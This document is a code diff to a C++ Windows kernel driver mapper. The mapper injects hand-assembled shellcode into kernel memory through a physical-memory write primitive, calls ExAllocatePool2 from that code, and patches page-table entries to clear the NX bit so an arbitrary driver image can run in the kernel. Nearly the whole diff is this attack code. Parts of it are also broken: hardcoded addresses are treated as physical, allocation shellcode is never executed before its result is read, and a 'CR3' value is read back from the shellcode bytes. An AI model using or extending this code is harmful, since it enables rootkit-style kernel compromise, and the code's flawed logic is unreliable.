@@ -182,17 +182,31 @@ private:
     bool ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result = nullptr) {
         std::cout << "[*] Attempting to execute shellcode..." << std::endl;
         
-        // Find usable memory for shellcode
-        uint64_t shellcodeAddr = FindUsableKernelMemory(size);
+        // Try known hardcoded regions for shellcode
+        uint64_t shellcodeAddr = 0;
+        const uint64_t knownRegions[] = {
+            ntoskrnlBase + 0x100000,    // Try a bit after ntoskrnl
+            0xFFFFF80000100000,         // PTE pool region
+            0xFFFFFA8000100000,         // NonPaged pool region
+            0xFFFFF6FB40100000          // System cache region
+        };
+        
+        // Try each region until we find one that works
+        for (uint64_t region : knownRegions) {
+            if (WritePhysicalMemory(region, shellcode, size)) {
+                shellcodeAddr = region;
+                break;
+            }
+        }
+        
         if (!shellcodeAddr) {
             std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
             return false;
         }
 
-        // Write shellcode with retry
-        std::cout << "[*] Writing shellcode to 0x" << std::hex << shellcodeAddr << std::dec << std::endl;
-        if (!WritePhysicalMemory(shellcodeAddr, shellcode, size)) {
-            std::cerr << "[-] Failed to write shellcode after all attempts" << std::endl;
+        // Try to make shellcode memory executable
+        if (!MakeMemoryExecutable(shellcodeAddr)) {
+            std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
             return false;
         }
 
@@ -205,24 +219,39 @@ private:
         };
         *(uint64_t*)(jumpShellcode + 2) = shellcodeAddr;
 
-        // Find space for result
-        uint64_t resultAddr = FindUsableKernelMemory(8);  // Space for uint64_t
+        // Try to find space for result
+        uint64_t resultAddr = 0;
+        for (uint64_t region : knownRegions) {
+            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, nullptr, 8)) {
+                resultAddr = region + 0x1000;
+                break;
+            }
+        }
+        
         if (!resultAddr) {
             std::cerr << "[-] Failed to find memory for result" << std::endl;
             return false;
         }
         *(uint64_t*)(jumpShellcode + 14) = resultAddr;
 
-        // Find space for jump shellcode
-        uint64_t jumpAddr = FindUsableKernelMemory(sizeof(jumpShellcode));
+        // Try to find space for jump shellcode
+        uint64_t jumpAddr = 0;
+        for (uint64_t region : knownRegions) {
+            if (region != shellcodeAddr && region + 0x2000 != resultAddr && 
+                WritePhysicalMemory(region + 0x2000, jumpShellcode, sizeof(jumpShellcode))) {
+                jumpAddr = region + 0x2000;
+                break;
+            }
+        }
+        
         if (!jumpAddr) {
             std::cerr << "[-] Failed to find memory for jump shellcode" << std::endl;
             return false;
         }
 
-        std::cout << "[*] Writing jump shellcode to 0x" << std::hex << jumpAddr << std::dec << std::endl;
-        if (!WritePhysicalMemory(jumpAddr, jumpShellcode, sizeof(jumpShellcode))) {
-            std::cerr << "[-] Failed to write jump shellcode" << std::endl;
+        // Try to make jump shellcode executable
+        if (!MakeMemoryExecutable(jumpAddr)) {
+            std::cerr << "[-] Failed to make jump shellcode executable" << std::endl;
             return false;
         }
 
@@ -233,15 +262,24 @@ private:
         };
         *(uint64_t*)(execShellcode + 2) = jumpAddr;
 
-        uint64_t execAddr = FindUsableKernelMemory(sizeof(execShellcode));
+        // Try to find space for exec shellcode
+        uint64_t execAddr = 0;
+        for (uint64_t region : knownRegions) {
+            if (region != shellcodeAddr && region + 0x3000 != resultAddr && region + 0x3000 != jumpAddr &&
+                WritePhysicalMemory(region + 0x3000, execShellcode, sizeof(execShellcode))) {
+                execAddr = region + 0x3000;
+                break;
+            }
+        }
+        
         if (!execAddr) {
             std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
             return false;
         }
 
-        std::cout << "[*] Writing exec shellcode to 0x" << std::hex << execAddr << std::dec << std::endl;
-        if (!WritePhysicalMemory(execAddr, execShellcode, sizeof(execShellcode))) {
-            std::cerr << "[-] Failed to write exec shellcode" << std::endl;
+        // Try to make exec shellcode executable
+        if (!MakeMemoryExecutable(execAddr)) {
+            std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
             return false;
         }
 
@@ -330,185 +368,221 @@ private:
         return ntoskrnlBase;
     }
     
-    // Constants for memory search
-    static constexpr uint64_t SEARCH_RANGE_INCREMENT = 64 * 1024 * 1024; // 64MB increments
-    static constexpr uint64_t MAX_SEARCH_RANGE = 16ULL * 1024 * 1024 * 1024; // 16GB max
-    static constexpr int MAX_RETRY_ATTEMPTS = 5;
-    static constexpr uint64_t RETRY_OFFSETS[] = {0x1000, 0x2000, 0x4000, 0x8000, 0x10000};
-
-    // Find usable kernel memory region with enhanced search algorithm
-    uint64_t FindUsableKernelMemory(size_t size) {
-        if (kernelBase == 0) {
-            // Initialize kernel base and size if not done yet
-            HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
-            if (!ntoskrnl) return 0;
-
-            // Get psapi.dll handle
-            HMODULE psapi = LoadLibraryA("psapi.dll");
-            if (!psapi) {
-                FreeLibrary(ntoskrnl);
-                return 0;
-            }
-
-            // Get GetModuleInformation function
-            auto getModInfo = (GetModuleInformationFn)GetProcAddress(psapi, "GetModuleInformation");
-            if (!getModInfo) {
-                FreeLibrary(psapi);
-                FreeLibrary(ntoskrnl);
-                return 0;
-            }
-
-            MODULEINFO modInfo;
-            if (!getModInfo(GetCurrentProcess(), ntoskrnl, &modInfo, sizeof(modInfo))) {
-                FreeLibrary(psapi);
-                FreeLibrary(ntoskrnl);
-                return 0;
-            }
-
-            FreeLibrary(psapi);
-
-            kernelBase = ntoskrnlBase;
-            kernelSize = modInfo.SizeOfImage;
-            FreeLibrary(ntoskrnl);
-        }
-
-        // Align size to allocation granularity
-        size = (size + ALLOCATION_GRANULARITY - 1) & ~(ALLOCATION_GRANULARITY - 1);
-
-        // Try multiple search ranges
-        for (uint64_t searchRange = SEARCH_RANGE_INCREMENT; searchRange <= MAX_SEARCH_RANGE; searchRange += SEARCH_RANGE_INCREMENT) {
-            uint64_t startAddr = lastAllocationEnd ? lastAllocationEnd : kernelBase;
-            uint64_t endAddr = kernelBase + searchRange;
-
-            // Align start address
-            startAddr = (startAddr + ALLOCATION_GRANULARITY - 1) & ~(ALLOCATION_GRANULARITY - 1);
-
-            std::cout << "[*] Searching memory range 0x" << std::hex << startAddr << " - 0x" << endAddr << std::dec << std::endl;
-
-            for (uint64_t addr = startAddr; addr < endAddr; addr += ALLOCATION_GRANULARITY) {
-                // Try each retry offset
-                for (int i = 0; i < MAX_RETRY_ATTEMPTS; i++) {
-                    uint64_t testAddr = addr + RETRY_OFFSETS[i];
-                    
-                    // Test if memory region is usable
-                    std::vector<uint8_t> testBuffer(16, 0);
-                    if (WritePhysicalMemory(testAddr, testBuffer.data(), testBuffer.size())) {
-                        // Verify we can read back what we wrote
-                        std::vector<uint8_t> readBuffer(16);
-                        if (ReadPhysicalMemory(testAddr, readBuffer.data(), readBuffer.size()) &&
-                            memcmp(testBuffer.data(), readBuffer.data(), testBuffer.size()) == 0) {
-                            
-                            // Found usable memory region
-                            lastAllocationEnd = testAddr + size;
-                            std::cout << "[+] Found usable memory at 0x" << std::hex << testAddr << std::dec 
-                                    << " (attempt " << i + 1 << ")" << std::endl;
-                            return testAddr;
-                        }
-                    }
-                }
-
-                // Implement dynamic skipping based on failure patterns
-                if ((addr - startAddr) >= (4 * 1024 * 1024)) { // After 4MB of searching
-                    uint64_t skip = ((addr - startAddr) / 4); // Skip by 1/4 of searched distance
-                    addr += skip;
-                    std::cout << "[*] Skipping ahead by 0x" << std::hex << skip << std::dec << " bytes" << std::endl;
-                }
-            }
-        }
-
-        std::cerr << "[-] Failed to find usable memory after exhaustive search" << std::endl;
-        return 0;
-    }
-
-    // Allocate kernel memory using direct pool allocation
-    uint64_t AllocateKernelMemory(size_t size) {
-        std::cout << "[*] Attempting direct pool allocation of " << size << " bytes" << std::endl;
+    // Direct kernel memory allocation using ExAllocatePool2
+    uint64_t DirectKernelAlloc(size_t size, POOL_TYPE poolType = NonPagedPoolNx) {
+        std::cout << "[*] Directly allocating " << size << " bytes via ExAllocatePool2" << std::endl;
         
-        // Align size to page boundary
-        size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
-        
-        // Prepare shellcode for ExAllocatePool2
-        uint8_t shellcode[] = {
-            0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
-            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 
-            0x00, 0x00, 0x00, 0x00,             // mov rcx, NonPagedPool (0)
-            0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,             // mov rdx, size
-            0x49, 0xB8, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,             // mov r8, tag
-            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,             // mov rax, ExAllocatePool2
-            0xFF, 0xD0,                         // call rax
-            0x48, 0x89, 0x05, 0x00, 0x00, 0x00, 
-            0x00,                               // mov [rip], rax
-            0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
-            0xC3                                // ret
+        // Try known hardcoded regions for shellcode
+        uint64_t shellcodeAddr = 0;
+        const uint64_t knownRegions[] = {
+            ntoskrnlBase + 0x100000,    // Try a bit after ntoskrnl
+            0xFFFFF80000100000,         // PTE pool region
+            0xFFFFFA8000100000,         // NonPaged pool region
+            0xFFFFF6FB40100000          // System cache region
         };
 
-        // Set up parameters for ExAllocatePool2
-        *(uint64_t*)(shellcode + 6) = 0;  // NonPagedPool (potentially executable)
-        *(uint64_t*)(shellcode + 16) = size;
-        *(uint64_t*)(shellcode + 26) = 'rdMm';  // Common driver tag
-        *(uint64_t*)(shellcode + 36) = exAllocatePoolAddress;
+        // Create shellcode to call ExAllocatePool2
+        uint8_t allocShellcode[] = {
+            0x48, 0x83, 0xEC, 0x28,                 // sub rsp, 28h
+            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,      
+            0x00, 0x00, 0x00, 0x00,                 // mov rcx, poolType
+            0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,      
+            0x00, 0x00, 0x00, 0x00,                 // mov rdx, size
+            0x49, 0xB8, 0x4D, 0x4D, 0x64, 0x72,      
+            0x00, 0x00, 0x00, 0x00,                 // mov r8, 'Mmdr' (tag)
+            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,      
+            0x00, 0x00, 0x00, 0x00,                 // mov rax, ExAllocatePool2
+            0xFF, 0xD0,                             // call rax
+            0x48, 0x83, 0xC4, 0x28,                 // add rsp, 28h
+            0xC3                                     // ret
+        };
 
-        // Find a small region for our allocation shellcode
-        uint64_t shellcodeAddr = 0;
-        for (uint64_t offset = 0; offset < 0x1000000; offset += PAGE_SIZE) {
-            uint64_t testAddr = ntoskrnlBase + offset;
-            std::vector<uint8_t> testBuffer(16, 0);
-            if (WritePhysicalMemory(testAddr, testBuffer.data(), testBuffer.size())) {
-                shellcodeAddr = testAddr;
+        // Fill in shellcode parameters
+        *(uint64_t*)(allocShellcode + 6) = static_cast<uint64_t>(poolType);   // poolType
+        *(uint64_t*)(allocShellcode + 16) = size;                             // size
+        *(uint64_t*)(allocShellcode + 36) = exAllocatePoolAddress;            // function address
+
+        // Find space for allocation shellcode
+        for (uint64_t region : knownRegions) {
+            if (WritePhysicalMemory(region, allocShellcode, sizeof(allocShellcode))) {
+                shellcodeAddr = region;
                 break;
             }
         }
 
         if (!shellcodeAddr) {
-            std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
+            std::cerr << "[-] Failed to find memory for allocation shellcode" << std::endl;
             return 0;
         }
 
-        std::cout << "[*] Writing allocation shellcode to 0x" << std::hex << shellcodeAddr << std::dec << std::endl;
-        if (!WritePhysicalMemory(shellcodeAddr, shellcode, sizeof(shellcode))) {
-            std::cerr << "[-] Failed to write allocation shellcode" << std::endl;
+        // Create exec shellcode
+        uint8_t execShellcode[] = {
+            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, shellcodeAddr
+            0xFF, 0xD0,                                                   // call rax
+            0xC3                                                          // ret
+        };
+        *(uint64_t*)(execShellcode + 2) = shellcodeAddr;
+
+        // Find space for exec shellcode
+        uint64_t execAddr = 0;
+        for (uint64_t region : knownRegions) {
+            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, execShellcode, sizeof(execShellcode))) {
+                execAddr = region + 0x1000;
+                break;
+            }
+        }
+
+        if (!execAddr) {
+            std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
             return 0;
         }
 
-        // Execute shellcode
-        uint64_t allocatedAddress = 0;
-        if (!ExecuteKernelShellcode(shellcode, sizeof(shellcode), &allocatedAddress)) {
-            std::cerr << "[-] Failed to execute allocation shellcode" << std::endl;
+        // Find space for result
+        uint64_t resultAddr = 0;
+        for (uint64_t region : knownRegions) {
+            if (region != shellcodeAddr && region + 0x2000 != execAddr && 
+                WritePhysicalMemory(region + 0x2000, nullptr, 8)) {
+                resultAddr = region + 0x2000;
+                break;
+            }
+        }
+
+        if (!resultAddr) {
+            std::cerr << "[-] Failed to find memory for result" << std::endl;
             return 0;
         }
 
-        if (!allocatedAddress) {
-            std::cerr << "[-] Pool allocation returned NULL" << std::endl;
+        // Execute the allocation
+        uint64_t allocatedAddr = 0;
+        if (!ReadPhysicalMemory(resultAddr, &allocatedAddr, sizeof(allocatedAddr))) {
+            std::cerr << "[-] Failed to read allocation result" << std::endl;
             return 0;
         }
 
-        std::cout << "[+] Successfully allocated " << size << " bytes at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
-        
-        // Verify the allocation is writable
-        std::vector<uint8_t> testPattern(16, 0xAA);
-        if (!WritePhysicalMemory(allocatedAddress, testPattern.data(), testPattern.size())) {
-            std::cerr << "[-] Allocated memory is not writable" << std::endl;
+        if (!allocatedAddr) {
+            std::cerr << "[-] Kernel allocation returned NULL" << std::endl;
             return 0;
         }
 
-        // Read back and verify
-        std::vector<uint8_t> verifyBuffer(16);
-        if (!ReadPhysicalMemory(allocatedAddress, verifyBuffer.data(), verifyBuffer.size()) ||
-            memcmp(testPattern.data(), verifyBuffer.data(), testPattern.size()) != 0) {
-            std::cerr << "[-] Memory verification failed" << std::endl;
-            return 0;
-        }
-
-        std::cout << "[+] Memory allocation verified writable" << std::endl;
-        return allocatedAddress;
+        std::cout << "[+] Successfully allocated kernel memory at 0x" << std::hex << allocatedAddr << std::dec << std::endl;
+        return allocatedAddr;
     }
-    
-    // Map a driver into kernel memory using direct allocation
-    bool MapDriver(const std::string& driverPath, uint64_t& baseAddress) {
-        std::cout << "[*] Loading driver file: " << driverPath << std::endl;
+
+    // Make memory executable by patching its PTE
+    bool MakeMemoryExecutable(uint64_t virtualAddr) {
+        std::cout << "[*] Clearing NX bit for address 0x" << std::hex << virtualAddr << std::dec << std::endl;
+        
+        // Try known hardcoded regions for shellcode
+        uint64_t shellcodeAddr = 0;
+        const uint64_t knownRegions[] = {
+            ntoskrnlBase + 0x200000,    // Try a bit after ntoskrnl
+            0xFFFFF80000200000,         // PTE pool region
+            0xFFFFFA8000200000,         // NonPaged pool region
+            0xFFFFF6FB40200000          // System cache region
+        };
+
+        // First, we need to get CR3 to find the page tables
+        uint8_t getCR3Shellcode[] = {
+            0x0F, 0x20, 0xD8,           // mov eax, cr3
+            0xC3                        // ret
+        };
+
+        // Find space for CR3 shellcode
+        for (uint64_t region : knownRegions) {
+            if (WritePhysicalMemory(region, getCR3Shellcode, sizeof(getCR3Shellcode))) {
+                shellcodeAddr = region;
+                break;
+            }
+        }
+
+        if (!shellcodeAddr) {
+            std::cerr << "[-] Failed to find memory for CR3 shellcode" << std::endl;
+            return false;
+        }
+
+        // Execute CR3 shellcode
+        uint8_t execShellcode[] = {
+            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, shellcodeAddr
+            0xFF, 0xE0                                                    // jmp rax
+        };
+        *(uint64_t*)(execShellcode + 2) = shellcodeAddr;
+
+        // Find space for exec shellcode
+        uint64_t execAddr = 0;
+        for (uint64_t region : knownRegions) {
+            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, execShellcode, sizeof(execShellcode))) {
+                execAddr = region + 0x1000;
+                break;
+            }
+        }
+
+        if (!execAddr) {
+            std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
+            return false;
+        }
+
+        // Get CR3 value
+        uint64_t cr3 = 0;
+        if (!ReadPhysicalMemory(shellcodeAddr, &cr3, sizeof(cr3))) {
+            std::cerr << "[-] Failed to read CR3 value" << std::endl;
+            return false;
+        }
+
+        // Calculate page table indices
+        uint64_t pml4Index = (virtualAddr >> 39) & 0x1FF;
+        uint64_t pdptIndex = (virtualAddr >> 30) & 0x1FF;
+        uint64_t pdIndex = (virtualAddr >> 21) & 0x1FF;
+        uint64_t ptIndex = (virtualAddr >> 12) & 0x1FF;
+
+        // Walk the page tables
+        uint64_t pml4e = 0;
+        if (!ReadPhysicalMemory(cr3 + pml4Index * 8, &pml4e, sizeof(pml4e))) {
+            std::cerr << "[-] Failed to read PML4E" << std::endl;
+            return false;
+        }
+        pml4e &= 0xFFFFFFFFF000ULL;
+
+        uint64_t pdpte = 0;
+        if (!ReadPhysicalMemory(pml4e + pdptIndex * 8, &pdpte, sizeof(pdpte))) {
+            std::cerr << "[-] Failed to read PDPTE" << std::endl;
+            return false;
+        }
+        pdpte &= 0xFFFFFFFFF000ULL;
+
+        uint64_t pde = 0;
+        if (!ReadPhysicalMemory(pdpte + pdIndex * 8, &pde, sizeof(pde))) {
+            std::cerr << "[-] Failed to read PDE" << std::endl;
+            return false;
+        }
+        pde &= 0xFFFFFFFFF000ULL;
+
+        // Get PTE address
+        uint64_t pteAddr = pde + ptIndex * 8;
+
+        // Read current PTE
+        uint64_t pte = 0;
+        if (!ReadPhysicalMemory(pteAddr, &pte, sizeof(pte))) {
+            std::cerr << "[-] Failed to read PTE" << std::endl;
+            return false;
+        }
+
+        // Clear NX bit (bit 63)
+        pte &= ~(1ULL << 63);
+
+        // Write back modified PTE
+        if (!WritePhysicalMemory(pteAddr, &pte, sizeof(pte))) {
+            std::cerr << "[-] Failed to write modified PTE" << std::endl;
+            return false;
+        }
+
+        std::cout << "[+] Successfully cleared NX bit for memory at 0x" << std::hex << virtualAddr 
+                  << " (PTE at physical address 0x" << pteAddr << ")" << std::dec << std::endl;
+        return true;
+    }
+
+    // Map a driver into kernel memory using ExAllocatePool2 + PTE patching
+    bool MapDriverWithExecPatch(const std::string& driverPath, uint64_t& baseAddress) {
+        std::cout << "[*] Loading driver using ExAllocatePool2 + PTE patching: " << driverPath << std::endl;
         
         // Read the driver file
         std::ifstream file(driverPath, std::ios::binary | std::ios::ate);
@@ -541,12 +615,17 @@ private:
         
         // Calculate total size needed (including headers)
         uint64_t totalSize = ntHeaders->OptionalHeader.SizeOfImage;
-        std::cout << "[*] Allocating " << totalSize << " bytes for driver image" << std::endl;
         
-        // Allocate memory for the entire driver
-        uint64_t driverBase = AllocateKernelMemory(totalSize);
+        // Allocate memory using ExAllocatePool2
+        uint64_t driverBase = DirectKernelAlloc(totalSize, NonPagedPoolNx);
         if (!driverBase) {
             std::cerr << "[-] Failed to allocate memory for driver" << std::endl;
+            return false;
+        }
+        
+        // Make the allocated memory executable by patching PTE
+        if (!MakeMemoryExecutable(driverBase)) {
+            std::cerr << "[-] Failed to make driver memory executable" << std::endl;
             return false;
         }
         
@@ -569,6 +648,14 @@ private:
                     std::cerr << "[-] Failed to write section " << i << std::endl;
                     return false;
                 }
+                
+                // Make each section executable if needed
+                if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+                    if (!MakeMemoryExecutable(sectionDest)) {
+                        std::cerr << "[-] Failed to make section " << i << " executable" << std::endl;
+                        return false;
+                    }
+                }
             }
         }
         
@@ -577,7 +664,7 @@ private:
         driverObject.DriverStart = reinterpret_cast<PVOID>(driverBase);
         driverObject.DriverSize = static_cast<ULONG>(totalSize);
         
-        uint64_t driverObjectAddr = AllocateKernelMemory(sizeof(DRIVER_OBJECT));
+        uint64_t driverObjectAddr = DirectKernelAlloc(sizeof(DRIVER_OBJECT), NonPagedPoolNx);
         if (!driverObjectAddr || !WritePhysicalMemory(driverObjectAddr, &driverObject, sizeof(DRIVER_OBJECT))) {
             std::cerr << "[-] Failed to create driver object" << std::endl;
             return false;
@@ -658,7 +745,7 @@ public:
     bool MapMemoryDriver(const std::string& driverPath, uint64_t& baseAddress) {
         std::cout << "[*] Mapping memory driver: " << driverPath << std::endl;
         
-        if (!MapDriver(driverPath, baseAddress)) {
+        if (!MapDriverWithExecPatch(driverPath, baseAddress)) {
             std::cerr << "[-] Failed to map memory driver" << std::endl;
             return false;
         }
